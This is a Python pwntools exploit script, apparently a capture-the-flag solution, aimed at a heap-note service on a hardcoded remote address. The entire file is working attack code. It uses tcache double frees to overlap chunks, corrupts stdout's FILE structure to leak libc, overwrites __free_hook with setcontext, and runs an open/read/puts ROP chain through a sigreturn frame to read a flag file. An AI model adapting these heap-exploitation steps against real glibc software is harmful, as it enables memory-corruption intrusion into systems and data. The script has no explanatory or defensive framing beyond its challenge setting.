from pwn import*
context.arch = 'AMD64'
def new(content):
	p.sendline("POST /create Cookie: user=admin token: \x34\r\n\r\ncontent=" + content)
	sleep(0.05)
def free(idx):
	p.sendline("POST /del Cookie: user=admin token: \x34\r\n\r\nindex=" + str(idx))
	sleep(0.05)
def edit(idx,content):
	p.sendline("POST /edit Cookie: user=admin token: \x34\r\n\r\nindex=" +str(idx) +  "&content="+ content)
	sleep(0.05)
while True:
	p = process('./main')
	p = remote('183.129.189.61',53702)
	libc =ELF('./libc-2.27.so')
	try:
		new("F"*0x80)
		new("M"*0x20 + '\x00')
		new("F"*0x10 + '\x00')
		new("F"*0x100)
		p.recvuntil("Your gift: ")
		heap_base = int(p.recvuntil('"}',drop=True),16) - 0x260
		log.info('HEAP:\t' + hex(heap_base))

		for i in range(8):
			free(0)
		free(2)
		free(2)
		free(2)
		new(p64(heap_base + 0x260))
		new(p64(heap_base + 0x260))
		new('\x60\x47')

		free(1)
		free(1)
		new("F"*0x20)
		edit(7,p64(heap_base + 0x260))
		new("F"*0x20)
		new("F"*0x20)
		new("F"*0x28)
		edit(10,p64(0xFBAD1800) + p64(0)*3 + '\xC8')
		libc_base = u64(p.recvuntil('\x7F',timeout=0.3)[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
		log.info('LIBC:\t' + hex(libc_base))
		free_hook = libc_base + libc.sym['__free_hook']
		system = libc_base + libc.sym['system']
		setcontext = libc_base + libc.sym['setcontext'] + 53
		rce = libc_base + 0x4F3C2
		free(2)
		free(2)
		new(p64(free_hook))
		new("FMYY")
		new(p64(setcontext))
		ret = libc_base  + 0x00000000000008AA

		Open = libc_base + libc.symbols["open"]
		Read = libc_base + libc.symbols["read"]
		Puts = libc_base + libc.symbols['puts']
		pop_rdi_ret = libc_base + 0x000000000002155F
		pop_rsi_ret = libc_base + 0x0000000000023E8A
		pop_rdx_ret = libc_base + 0x0000000000001B96
		orw  = ''
		orw += p64(pop_rdi_ret)+p64(heap_base + 0x3B8)
		orw += p64(pop_rsi_ret)+p64(0)
		orw += p64(Open)
		orw += p64(pop_rdi_ret) + p64(4)
		orw += p64(pop_rdx_ret) + p64(0x30)
		orw += p64(pop_rsi_ret) + p64(heap_base)
		orw += p64(Read)
		orw += p64(pop_rdi_ret)+p64(heap_base)
		orw += p64(Puts)
		orw += './flag\x00'
		frame = SigreturnFrame()
		frame.rax = 0
		frame.rdi = 0
		frame.rsi = 0
		frame.rdx = 0
		frame.rsp = heap_base + 0x250 + 0x90 + 0x30 + 0x20 + 0x10
		frame.rip = ret
		payload = orw + str(frame)[len(orw):]
		edit(3,payload)
		free(3)
		break
	except:
		p.close()
		continue
p.interactive()
